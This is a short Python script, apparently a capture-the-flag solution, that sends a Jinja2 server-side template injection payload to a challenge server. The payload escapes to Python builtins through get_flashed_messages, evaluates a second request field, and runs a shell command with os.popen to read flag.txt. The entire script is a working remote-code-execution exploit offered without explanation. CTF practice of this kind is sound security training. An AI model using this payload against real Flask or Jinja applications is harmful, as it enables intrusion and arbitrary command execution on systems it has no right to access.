import requests

url = "http://challs.n00bzunit3d.xyz:52130/generate"
payload = "{{get_flashed_messages['__built''ins__'].eval(request.values['a'])}}"
a="__import__('os').popen('cat flag.txt').read()"

data = {
    "name": payload,
    "a": a,
    "team_name": "c"
}

response = requests.post(url, data=data)
print(response.text)
